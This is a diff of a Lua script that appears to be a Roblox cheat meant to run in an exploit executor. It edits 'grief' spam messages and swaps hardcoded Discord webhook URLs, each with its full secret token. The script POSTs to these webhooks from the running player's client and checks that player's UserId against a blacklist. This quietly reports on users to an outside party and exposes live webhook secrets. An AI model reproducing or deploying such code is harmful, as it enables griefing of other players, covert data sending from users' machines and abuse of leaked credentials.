@@ -38,10 +38,10 @@ local yep = "?"
 
 local txt = [[
     {
-        "grief 0002",
-        "grief 0002",
-        "grief 0002",
-        "grief 0002",
+        " ",
+        " ",
+        " ",
+        " ",
     }
 ]]
 
@@ -65,7 +65,7 @@ local randomIndex = math.random(1, #spam)
 local message = spam[randomIndex]
 
 local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1089256562469642250/pfa36vKqEX-kh4oCILmVOH6pEYMW9YhpGQpcN-TGxwqKJ-hCluo76QZ8LXGOToNHDioA"
+local Webhook_URL = "https://discord.com/api/webhooks/1089917717970169926/Zz1EnnFSV1mKP9DtjPlP47TDitKMr1-LXM-OguNSNuDrbr9xgvCnM_9LBpKwxPj5ljm4"
 
 local response = syn.request({
     Url = Webhook_URL,
@@ -104,7 +104,7 @@ if table.find(Blacklisted, game:GetService("Players").LocalPlayer.UserId) then
 end
 
 if isfile("123712091724.lua") then
-local BlacklistWebhook_URL = "https://discord.com/api/webhooks/1089252885277179994/JBEflHf1Lnma_528KvvVnSiVI6ghSnKyRM9ZDC9HS8iFjcDP1qke9OGeRcaduEu4c03I"
+local BlacklistWebhook_URL = "https://discord.com/api/webhooks/1089917726736265248/Mrd2qwArOcdXD2qOs3mW6sd6RQ1hq29rR-qzrigpGasCHAaGcWBKAo1s5Hjg5w16LS3r"
     local response_blacklist = syn.request({
         Url = BlacklistWebhook_URL,
         Method = 'POST',
